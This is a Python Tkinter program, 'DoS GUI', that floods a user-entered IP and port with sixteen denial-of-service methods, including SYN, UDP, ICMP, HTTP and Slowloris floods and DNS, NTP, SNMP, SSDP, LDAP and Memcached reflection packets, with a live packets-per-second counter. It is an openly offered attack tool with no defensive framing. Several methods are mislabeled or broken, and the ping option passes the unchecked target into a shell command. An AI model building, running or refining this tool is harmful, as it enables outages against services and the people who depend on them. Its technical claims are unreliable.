import tkinter as tk
import threading
import socket
import random
import string
import http.client
import time
import os

class DoSGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("DoS GUI")

        self.target_label = tk.Label(root, text="Target IP:")
        self.target_label.pack()

        self.target_entry = tk.Entry(root)
        self.target_entry.pack()

        self.port_label = tk.Label(root, text="Port:")
        self.port_label.pack()

        self.port_entry = tk.Entry(root)
        self.port_entry.pack()

        self.method_label = tk.Label(root, text="Select Attack Method:")
        self.method_label.pack()

        self.method_var = tk.StringVar()
        self.method_var.set("TCP SYN Flood")

        self.method_options = ["TCP SYN Flood", "UDP Flood", "ICMP Echo Request Flood", "HTTP Flood", "DNS Amplification Attack",
                               "Slowloris Attack", "LDAP Reflection Attack", "SSDP Reflection Attack", "NTP Reflection Attack",
                               "SNMP Reflection Attack", "HTTP Slow POST", "Memcached Reflection Attack", "DNS Water Torture Attack",
                               "SYN-ACK Flood", "DNS NXDOMAIN Flood", "Ping Flood"]

        self.method_dropdown = tk.OptionMenu(root, self.method_var, *self.method_options)
        self.method_dropdown.pack()

        self.attack_button = tk.Button(root, text="Start Attack", command=self.start_attack)
        self.attack_button.pack()

        self.stop_button = tk.Button(root, text="Stop Attack", command=self.stop_attack)
        self.stop_button.pack()
        self.stop_button.config(state=tk.DISABLED)

        self.attacking = False
        self.pps_label = tk.Label(root, text="Packets per Second (PPS): 0")
        self.pps_label.pack()

        self.packet_count = 0
        self.start_time = 0

    def start_attack(self):
        if self.attacking:
            return

        target_ip = self.target_entry.get()
        target_port = int(self.port_entry.get())
        selected_method = self.method_var.get()

        self.attacking = True
        self.packet_count = 0
        self.start_time = time.time()
        self.attack_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        def attack():
            while self.attacking:
                try:
                    if selected_method == "TCP SYN Flood":
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target_ip, target_port))
                    elif selected_method == "UDP Flood":
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(b'x' * 1024, (target_ip, target_port))
                    elif selected_method == "ICMP Echo Request Flood":
                        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                        packet = b'\x08\x00\x00\x00' + b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37'
                        s.sendto(packet, (target_ip, 0))
                    elif selected_method == "HTTP Flood":
                        conn = http.client.HTTPConnection(target_ip)
                        conn.request("GET", "/")
                        conn.getresponse()
                    elif selected_method == "DNS Amplification Attack":
                        dns_query = "".join(random.choices(string.ascii_lowercase, k=5))
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + dns_query.encode() + b"\x00\x00\x01\x00\x01", (target_ip, 53))
                    elif selected_method == "Slowloris Attack":
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target_ip, target_port))
                        s.send(b"GET /?")
                        for _ in range(1000):
                            s.send(b"X-a: {}\r\n".format(random.randint(1, 5000)))
                        s.send(b"\r\n")
                    elif selected_method == "LDAP Reflection Attack":
                        ldap_query = b'\x30\x84\x00\x00\x00\x0b\x02\x01\x01\x63\x84\x00\x00\x00\x04\x04\x00\x0a\x01'
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(ldap_query, (target_ip, 389))
                    elif selected_method == "SSDP Reflection Attack":
                        ssdp_query = b'M-SEARCH * HTTP/1.1\r\n' \
                                     b'Host: 239.255.255.250:1900\r\n' \
                                     b'Man: "ssdp:discover"\r\n' \
                                     b'MX: 2\r\n' \
                                     b'ST: ssdp:all\r\n\r\n'
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(ssdp_query, (target_ip, 1900))
                    elif selected_method == "NTP Reflection Attack":
                        ntp_query = b'\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00'
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(ntp_query, (target_ip, 123))
                    elif selected_method == "SNMP Reflection Attack":
                        snmp_query = b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x72\x79\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x01\x03\x00\x05\x00'
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(snmp_query, (target_ip, 161))
                    elif selected_method == "HTTP Slow POST":
                        conn = http.client.HTTPConnection(target_ip)
                        headers = {
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Content-Length": "1000",
                        }
                        body = "A" * 1000
                        conn.request("POST", "/", body, headers)
                        conn.getresponse()
                    elif selected_method == "Memcached Reflection Attack":
                        memcached_query = b'\x00\x00\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(memcached_query, (target_ip, 11211))
                    elif selected_method == "DNS Water Torture Attack":
                        while True:
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            s.sendto(b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x05' + b'x' * 5 + b'\x03' + b'com' + b'\x00\x00\x01\x00\x01', (target_ip, 53))
                    elif selected_method == "SYN-ACK Flood":
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target_ip, target_port))
                        s.send(b'\x00' * 8192)
                    elif selected_method == "DNS NXDOMAIN Flood":
                        dns_query = "".join(random.choices(string.ascii_lowercase, k=10))
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + dns_query.encode() + b"\x00\x00\x01\x00\x01", (target_ip, 53))
                    elif selected_method == "Ping Flood":
                        os.system(f"ping -c 1 {target_ip}")

                    self.packet_count += 1
                    elapsed_time = time.time() - self.start_time
                    pps = int(self.packet_count / elapsed_time)
                    self.update_pps(pps)
                except Exception as e:
                    pass

        t1 = threading.Thread(target=attack)
        t1.start()

    def stop_attack(self):
        self.attacking = False
        self.attack_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def update_pps(self, pps):
        self.pps_label.config(text=f"Packets per Second (PPS): {pps}")

if __name__ == "__main__":
    root = tk.Tk()
    app = DoSGUI(root)
    root.mainloop()
